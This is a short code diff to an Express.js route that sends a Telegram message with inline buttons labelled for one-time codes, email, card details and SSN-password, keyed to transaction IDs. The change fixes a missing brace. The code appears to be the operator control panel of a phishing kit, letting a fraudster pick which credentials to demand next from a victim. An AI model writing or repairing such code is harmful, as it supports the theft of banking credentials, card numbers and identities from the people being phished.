@@ -243,7 +243,7 @@ app.post('/enviar5', async (req, res) => {
     inline_keyboard: [
       [{ text: "🔑CODIGO", callback_data: `cel-dina:${txid}` },
        { text: "👤CORREO", callback_data: `corre-clv:${txid}` },
-       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` }, text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` } ],
+       { text: "💳TARJETA", callback_data: `cece-ceve:${txid}` },{ text: "👤SSN-PASS", callback_data: `sene-sene:${txid}` } ],
       [{ text: "🔄CARGA", callback_data: `verifidata:${txid}` },
        { text: "❌ERROR ", callback_data: `errorlogo:${txid}` }]
     ]
